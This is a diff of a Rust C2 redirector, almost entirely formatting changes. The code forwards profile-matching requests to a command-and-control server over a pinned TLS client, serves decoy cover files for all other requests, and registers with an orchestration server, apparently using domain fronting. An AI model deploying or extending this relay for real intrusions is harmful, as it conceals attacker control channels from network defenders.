@@ -42,7 +42,6 @@ use axum::{
     Router,
 };
 
-
 // ── CLI ──────────────────────────────────────────────────────────────────────
 
 #[derive(Parser, Debug)]
@@ -173,8 +172,9 @@ impl Profile {
 fn build_pinned_client(c2_cert: Option<&PathBuf>) -> Result<reqwest::Client> {
     let mut builder = reqwest::Client::builder();
     if let Some(cert_path) = c2_cert {
-        let cert_pem = std::fs::read(cert_path)
-            .map_err(|e| anyhow::anyhow!("failed to read C2 cert from {}: {}", cert_path.display(), e))?;
+        let cert_pem = std::fs::read(cert_path).map_err(|e| {
+            anyhow::anyhow!("failed to read C2 cert from {}: {}", cert_path.display(), e)
+        })?;
         builder = builder
             .tls_built_in_root_certs(false)
             .add_root_certificate(reqwest::Certificate::from_pem(&cert_pem)?);
@@ -214,7 +214,12 @@ struct LogEntry {
 }
 
 impl RedirectorState {
-    fn new(profile: &Profile, c2_addr: String, cover_dir: Option<PathBuf>, c2_cert: Option<&PathBuf>) -> Self {
+    fn new(
+        profile: &Profile,
+        c2_addr: String,
+        cover_dir: Option<PathBuf>,
+        c2_cert: Option<&PathBuf>,
+    ) -> Self {
         // P2-15: propagate error instead of panicking on client build failure.
         let c2_client = build_pinned_client(c2_cert)
             .expect("failed to build C2 HTTP client — check --c2-cert path");
@@ -261,10 +266,7 @@ impl RedirectorState {
 
 // ── Request handler ──────────────────────────────────────────────────────────
 
-async fn handle_request(
-    State(state): State<Arc<RedirectorState>>,
-    req: Request<Body>,
-) -> Response {
+async fn handle_request(State(state): State<Arc<RedirectorState>>, req: Request<Body>) -> Response {
     let uri = req.uri().path().to_string();
     let method = req.method().clone();
     let source_ip = req
@@ -278,9 +280,7 @@ async fn handle_request(
         // Forward to C2 server.
         let forward_url = format!("{}{}", state.c2_addr, req.uri());
 
-        let mut fwd = state
-            .c2_client
-            .request(method.clone(), &forward_url);
+        let mut fwd = state.c2_client.request(method.clone(), &forward_url);
 
         // Copy headers (except Host, which will be set by the C2 URL).
         for (name, value) in req.headers() {
@@ -305,15 +305,14 @@ async fn handle_request(
                 state.log_access(&source_ip, method.as_str(), &uri, true, status);
 
                 // Build response with the same status and headers.
-                let mut builder = axum::http::response::Builder::new()
-                    .status(status);
+                let mut builder = axum::http::response::Builder::new().status(status);
                 if let Some(headers) = builder.headers_mut() {
                     // Copy relevant response headers.
                     headers.insert("content-type", "application/octet-stream".parse().unwrap());
                 }
-                builder.body(Body::from(body.to_vec())).unwrap_or_else(|_| {
-                    (StatusCode::BAD_GATEWAY, "upstream error").into_response()
-                })
+                builder
+                    .body(Body::from(body.to_vec()))
+                    .unwrap_or_else(|_| (StatusCode::BAD_GATEWAY, "upstream error").into_response())
             }
             Err(e) => {
                 tracing::error!("C2 forward failed: {}", e);
@@ -363,11 +362,7 @@ async fn handle_request(
             if file_path.exists() {
                 if let Ok(contents) = tokio::fs::read(&file_path).await {
                     let content_type = guess_content_type(&file_path);
-                    return (
-                        StatusCode::OK,
-                        [("content-type", content_type)],
-                        contents,
-                    )
+                    return (StatusCode::OK, [("content-type", content_type)], contents)
                         .into_response();
                 }
             }
@@ -460,8 +455,7 @@ impl ServerConnection {
             anyhow::bail!("registration failed ({}): {}", status, text)
         }
     }
-
-    }
+}
 
 // ── Main ─────────────────────────────────────────────────────────────────────
 
@@ -497,21 +491,23 @@ async fn main() -> Result<()> {
         .with_state(state.clone());
 
     // Register with the Orchestra server if configured.
-    let server_conn = if let (Some(api_url), Some(token)) =
-        (cli.server_api.clone(), cli.server_token.clone())
-    {
-        let mut conn = ServerConnection::new(api_url, token, cli.c2_cert.as_ref());
-        let listen_url = format!("https://{}", cli.listen_addr);
-        if let Err(e) = conn
-            .register(&listen_url, &profile_name, cli.front_domain.as_deref())
-            .await
-        {
-            tracing::warn!("initial registration failed: {} (will retry in heartbeat loop)", e);
-        }
-        Some(conn)
-    } else {
-        None
-    };
+    let server_conn =
+        if let (Some(api_url), Some(token)) = (cli.server_api.clone(), cli.server_token.clone()) {
+            let mut conn = ServerConnection::new(api_url, token, cli.c2_cert.as_ref());
+            let listen_url = format!("https://{}", cli.listen_addr);
+            if let Err(e) = conn
+                .register(&listen_url, &profile_name, cli.front_domain.as_deref())
+                .await
+            {
+                tracing::warn!(
+                    "initial registration failed: {} (will retry in heartbeat loop)",
+                    e
+                );
+            }
+            Some(conn)
+        } else {
+            None
+        };
 
     // Start heartbeat task.
     if let Some(ref conn) = server_conn {
@@ -583,20 +579,15 @@ async fn main() -> Result<()> {
             // verification enabled.
             let ca_pem = std::fs::read(&ca_path)?;
 
-            let certs = rustls_pemfile::certs(&mut std::io::BufReader::new(
-                cert_pem.as_slice(),
-            ))
-            .collect::<Result<Vec<_>, _>>()?;
-            let key = rustls_pemfile::private_key(&mut std::io::BufReader::new(
-                key_pem.as_slice(),
-            ))?
-            .ok_or_else(|| anyhow::anyhow!("no private key found in TLS key PEM"))?;
+            let certs = rustls_pemfile::certs(&mut std::io::BufReader::new(cert_pem.as_slice()))
+                .collect::<Result<Vec<_>, _>>()?;
+            let key =
+                rustls_pemfile::private_key(&mut std::io::BufReader::new(key_pem.as_slice()))?
+                    .ok_or_else(|| anyhow::anyhow!("no private key found in TLS key PEM"))?;
 
             // Load the CA certificate(s) for client verification.
-            let ca_certs = rustls_pemfile::certs(&mut std::io::BufReader::new(
-                ca_pem.as_slice(),
-            ))
-            .collect::<Result<Vec<_>, _>>()?;
+            let ca_certs = rustls_pemfile::certs(&mut std::io::BufReader::new(ca_pem.as_slice()))
+                .collect::<Result<Vec<_>, _>>()?;
 
             let mut root_store = rustls::RootCertStore::empty();
             for ca in ca_certs {
@@ -604,8 +595,7 @@ async fn main() -> Result<()> {
             }
 
             let client_verifier =
-                rustls::server::WebPkiClientVerifier::builder(Arc::new(root_store))
-                    .build()?;
+                rustls::server::WebPkiClientVerifier::builder(Arc::new(root_store)).build()?;
 
             let server_config = rustls::ServerConfig::builder()
                 .with_client_cert_verifier(client_verifier)
@@ -628,12 +618,9 @@ async fn main() -> Result<()> {
             tls_config
         };
 
-        axum_server::bind_rustls(
-            cli.listen_addr.parse()?,
-            tls_cfg,
-        )
-        .serve(app.into_make_service())
-        .await?;
+        axum_server::bind_rustls(cli.listen_addr.parse()?, tls_cfg)
+            .serve(app.into_make_service())
+            .await?;
     } else {
         // Plain HTTP mode (for testing).
         tracing::warn!("running in plain HTTP mode (no TLS certificate configured)");
